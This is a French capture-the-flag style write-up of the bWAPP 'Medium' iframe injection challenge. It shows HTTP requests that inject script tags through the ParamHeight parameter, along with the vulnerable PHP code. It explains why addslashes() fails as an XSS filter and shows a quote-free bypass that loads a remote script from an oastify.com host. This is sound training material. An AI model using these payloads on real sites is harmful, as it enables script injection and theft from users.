# Niveau "Medium"

## Exploitation

La page du challenge permet de charger une `<iframe></iframe>`. L'URL admet 3 paramètres :&#x20;

* le premier, `ParamURL`, est l'URL cible de l'iframe, ayant comme valeur par défaut "robots.txt"
* le second et la troisième, `ParamWidth` et `ParamHeight`, sont la taille en largeur et en hauteur de l'iframe, ayant comme valeur par défaut "250"

Ici, modifier l'URL de l'iframe via le paramètre `ParamURL` ne semble pas fonctionner. Qu'importe sa valeur, le fichier "robots.txt" est affiché :

![](<../../../../../.gitbook/assets/image (8).png>)

Naturellement, l'injection via le paramètre d'URL `ParamUrl` ne fonctionne donc également pas. Il faut s'intéresser aux deux autres paramètres présents dans l'URL, qui eux peuvent être modifiés et ne semble pas être assainis :&#x20;

```http
GET /bWAPP/iframei.php?ParamUrl=whatever.txt&ParamWidth=250&ParamHeight=250%22%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C/script%3E%3Ciframe%20src= HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=36ce7aa0711c5215358577749d068476; security_level=1
Connection: close
```

![](<../../../../../.gitbook/assets/image (21).png>)

## Analyse du code source

L'application spécifie la valeur du `src` de l'iframe directement à la valeur "robots.txt" et ne tient pas compte de la valeur présente dans le paramètre d'URL `ParamUrl`. Ce n'est pas le cas des paramètres concernant la taille de l'iframe :&#x20;

{% code title="iframei.php" %}
```php
<?php
  if($_COOKIE["security_level"] == "1" || $_COOKIE["security_level"] == "2") {
?>
    <iframe frameborder="0" src="robots.txt" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
<?php
  }
?>
```
{% endcode %}

La méthode `xss()` est un `switch` exécutant une certaine méthode selon le niveau de sécurité actuel (1 dans le cas du niveau "Medium") : &#x20;

{% code title="iframei.php" %}
```php
function xss($data) {
  switch($_COOKIE["security_level"]) {
    case "0" :
      $data = no_check($data);      
      break;
    case "1" :
      $data = xss_check_4($data);
      break;
    case "2" :
      $data = xss_check_3($data);
      break;
    default :
      $data = no_check($data);
      break;   
  }

  return $data;
}
```
{% endcode %}

La méthode `xss_check_4()`, qui est censée assainir les paramètres renseignés par l'utilisateur, est exécutée :&#x20;

{% code title="functions_external.php" %}
```php
function xss_check_4($data) {
    // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
    // These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
    // Do NOT use this for XSS or HTML validations!!!

    return addslashes($data);
}
```
{% endcode %}

La méthode `addslashes()` permet d'échapper (en ajoutant un anti-slash) les caractères guillemets simples ( ' ), guillemets doubles ( " ), antislash (\\) et l'octet NUL :

![](<../../../../../.gitbook/assets/image (5) (1).png>)

Cela peut poser problème lorsque l'injection tente d'appeler un script externe par exemple :&#x20;

```http
GET /bWAPP/iframei.php?ParamUrl=whatever.txt&ParamWidth=250&ParamHeight=250%22%3E%3C/iframe%3E%3Cscript+src=%22https://zjm4zwo6g15m5kif9uvage7al1rrfg.oastify.com/xss.js%22%3E%3C/script%3E%3Ciframe%20src= HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=36ce7aa0711c5215358577749d068476; security_level=1
Connection: closeHTTP
```

![](<../../../../../.gitbook/assets/image (31).png>)

Le contournement est assez simple ici puisqu'il suffit de supprimer les guillemets, le navigateur va les ajouter automatiquement :&#x20;

```http
GET /bWAPP/iframei.php?ParamUrl=whatever.txt&ParamWidth=250&ParamHeight=250%22%3E%3C/iframe%3E%3Cscript+src=http://zjm4zwo6g15m5kif9uvage7al1rrfg.oastify.com/xss.js%3E%3C/script%3E%3Ciframe%20src= HTTP/1.1
Host: 192.168.56.116
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=36ce7aa0711c5215358577749d068476; security_level=1
Connection: close
```

![](<../../../../../.gitbook/assets/image (26).png>)
